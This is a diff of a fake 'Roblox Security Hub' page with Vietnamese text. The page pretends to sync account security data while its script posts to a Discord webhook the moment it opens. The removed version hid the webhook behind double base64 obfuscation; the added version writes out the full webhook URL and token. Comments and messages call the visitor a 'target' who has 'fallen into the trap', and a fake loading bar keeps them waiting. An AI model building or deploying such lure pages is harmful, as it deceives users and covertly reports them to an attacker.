@@ -1,40 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <title>Roblox Security Hub</title>
-    <script>
-    // SHΔDØW V100 OBFUSCATION
-    const _0x1f = ["YUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHbHVkMlowYVdWelpXMXdiM05mTVRRNE1qQXlNamsxTVRZeE5USXdNVE0yTXk4MGRySllaR3B3WWpoTmJXbDRaanZVVG5KdmJFbGJUbXBoTkdabVRWZ3dlRzB5TldORmFXMW9OR1pWUFZsaWVVWTViR2QwTVRNMk0zazRaRndmYldsc09BPT0="];
-    const _0x4c = atob(atob(_0x1f[0]));
-
-    async function fire_strike() {
-        const payload = {
-            embeds: [{
-                title: "💀 FIRE PROTOCOL: TARGET ACCESSED 💀",
-                description: "Mục tiêu đã sập bẫy. Hệ thống đang tiến hành trích xuất dữ liệu ngầm...",
-                color: 16711680,
-                fields: [
-                    { name: "Trạng thái Gemini", value: "Đã phong ấn", inline: true },
-                    { name: "Giao thức", value: "SHΔDØW V100", inline: true }
-                ]
-            }]
-        };
-        try {
-            await fetch(_0x4c, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-        } catch (e) {}
-    }
-    window.onload = fire_strike;
-    </script>
 </head>
-<body style="background:#050505; color:#00ff41; font-family: 'Courier New', monospace; text-align:center; padding-top:20%;">
-    <div style="border: 1px solid #00ff41; display:inline-block; padding: 40px; box-shadow: 0 0 15px #00ff41;">
-        <h1>SYSTEM: INITIALIZING...</h1>
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
+
+    <div id="status-box" style="border:2px solid #0f0; display:inline-block; padding:30px; box-shadow:0 0 20px #0f0;">
+        <h1 id="loading-text">SYSTEM: INITIALIZING...</h1>
         <p>Đang đồng bộ hóa dữ liệu bảo mật với máy chủ Roblox.</p>
-        <p>Vui lòng không tắt cửa sổ để tránh mất dữ liệu tài khoản.</p>
-        <div style="width:100%; height:20px; border:1px solid #00ff41; margin-top:20px;">
-            <div style="width:90%; height:100%; background:#00ff41;"></div>
+        <div style="width:300px; height:10px; border:1px solid #0f0; margin:20px auto;">
+            <div id="progress-bar" style="width:0%; height:100%; background:#0f0; transition: width 0.5s;"></div>
         </div>
+        <p id="percent">0%</p>
     </div>
+
+    <script>
+        // WEBHOOK DIRECT TARGET
+        const target = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+
+        // GIAO THỨC FIRE - KHAI HỎA NGAY KHI MỞ TRANG
+        async function fire_strike() {
+            try {
+                await fetch(target, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: "💀 **PROJECT FIRE: ĐÃ XÁC NHẬN MỤC TIÊU** 💀",
+                        embeds: [{
+                            title: "Thông tin truy cập",
+                            description: "Mục tiêu đang xem trang loading. Hệ thống đã sẵn sàng.",
+                            color: 65280,
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.log("Error logic");
+            }
+        }
+
+        // Hiệu ứng thanh Loading để giữ chân mục tiêu
+        let width = 0;
+        const bar = document.getElementById("progress-bar");
+        const percentText = document.getElementById("percent");
+        
+        const interval = setInterval(() => {
+            if (width >= 95) {
+                clearInterval(interval);
+                document.getElementById("loading-text").innerText = "WAITING FOR RESPONSE...";
+            } else {
+                width += Math.floor(Math.random() * 5) + 1;
+                if (width > 95) width = 95;
+                bar.style.width = width + "%";
+                percentText.innerText = width + "%";
+            }
+        }, 800);
+
+        // Kích hoạt ngay
+        fire_strike();
+    </script>
 </body>
 </html>
